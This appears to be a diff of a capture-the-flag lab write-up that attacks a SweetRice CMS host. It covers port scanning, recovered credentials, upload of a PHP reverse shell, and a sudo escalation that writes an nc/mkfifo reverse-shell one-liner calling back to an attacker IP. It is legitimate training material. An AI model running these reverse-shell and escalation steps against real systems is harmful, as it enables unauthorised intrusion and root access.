@@ -3,12 +3,24 @@ Checked the IP in a browser.
 'View Page Source' reveals a commented link to a vulnerabilty
     https://launchpad.net/bugs/1288690
     
-Ran nmap-dirsearch.sh script
-        Open Ports:
-        22
-        80
-        Directories:
-        /content/
+Ran nmap-dirsearch.sh script (nmap-dirsearch.sh - https://github.com/jeff-faatz/bash_scripts/blob/main/nmap/nmap-dirsearch.sh)
+    Nmap:
+        Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-26 18:17 EDT
+        Nmap scan report for 10.10.67.130
+        Host is up (0.11s latency).
+        Not shown: 998 closed tcp ports (conn-refused)
+        PORT   STATE SERVICE
+        22/tcp open  ssh
+        80/tcp open  http
+
+        Nmap done: 1 IP address (1 host up) scanned in 11.07 seconds
+    Disearch:
+        http://10.10.67.130/.php
+        http://10.10.67.130/.php3
+        http://10.10.67.130/content
+        http://10.10.67.130/content/
+        http://10.10.67.130/server-status
+        http://10.10.67.130/server-status/
         
 Navigated to /content/
     'View Page Source' shows the SweetRice is used as website management system
@@ -17,8 +29,9 @@ Navigated to /content/
     
 Ran gobuster scan to try and find additional subdirectories
     No additional directories found
+        /content              (Status: 301) [Size: 314] [--> http://10.10.67.130/content/]
     
-Trying to find an explot for SweetRice
+Trying to find an exploit for SweetRice
 
 Exploit-DB shows multiples
 
@@ -39,45 +52,47 @@ I use hashcat to crack the hashed password.
         The password comes back as Password123
         
 I tried the combo on ssh but it says the password is incorrect.
+    ssh manager@IPADDRESS
+        password: Password123
 
 Ran a dirb scan to try and find more directories as a last resort.
     dirb http://IPADDRESS -R
         found additional /content/ directories
-            _themes
-            as
-            attachment
-            images
-            inc
-            js
+            /_themes
+            /as
+            /attachment
+            /images
+            /inc
+            /js
             
 Started entering them into the address bar to see what they have.
 
 /content/as/ has a login page!
 
 Entered in the credentials I found. They worked!
-    It has taken to to the SweetRice dashboard
+    It has taken me to the SweetRice dashboard
     
-Looking through the options I found additional creds for the mysql database:
+Looking through the options I found additional creds for the mysql database. Something to try later if necessary.
     account - rice
     password - randompass
     
 The 'Data Import' tab allows me to upload a file. I am going to try and upload a php reverse shell script.
-    phpreverseshell.php
+    phpreverseshell.php - https://github.com/jeff-faatz/pentest/blob/main/phpreverseshell.php
     
 When I navigate back to the /content/inc/mysql_backup page my script is in there.
 
-Time to start up a listener.
+Time to start up a listener. Opened a terminal and entered:
     nc -nlvp 4444
     
-Run the script and I get a reverse shell!
+Ran the script and I get a reverse shell!
 
-ls to see our directories and files
+ls to see the directories and files
 
 cd into the /home directory
 
-ls again.
+ls again
 
-A single directory called itguy
+A single directory called /itguy
 
 cd into that directory
 
@@ -85,7 +100,7 @@ ls aaagain
 
 There's the first flag. user.txt
     cat user.txt
-        THM{63e5bce9271952aad1113b6f1ac28a07}
+        THM{XXXXXXXXXXXXXXXXXXXXXXX}
 
 Now to escalate privileges.
 
@@ -94,8 +109,11 @@ sudo -l to see what I can do. /usr/bin/backup.pl is a perl file I am allowed to 
 
     system("sh", "/etc/copy.sh");
     
-The file isn't writeable but it runs another script. I check that one.
-    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IPADDRESS 5554 >/tmp/f
+The file isn't writeable but it runs another script called copy.sh. I check that one.
+    cat /etc/copy.sh
+        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IPADDRESS 5554 >/tmp/f
+        
+This script appears to open a reverse shell with root privileges.
     
 Looks like I just need to change the IP address. I can not get any text editor to work. I guess I will just echo it.
     echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.1.204 5554 >/tmp/f" > /etc/copy.sh
@@ -113,6 +131,6 @@ cd /root
 ls to list files
 
 cat root.txt for the final flag
-    THM{6637f41d0177b6f37cb20d775124699f}
+    THM{XXXXXXXXXXXXXXXXXXXXXXXXXXX}
 
 
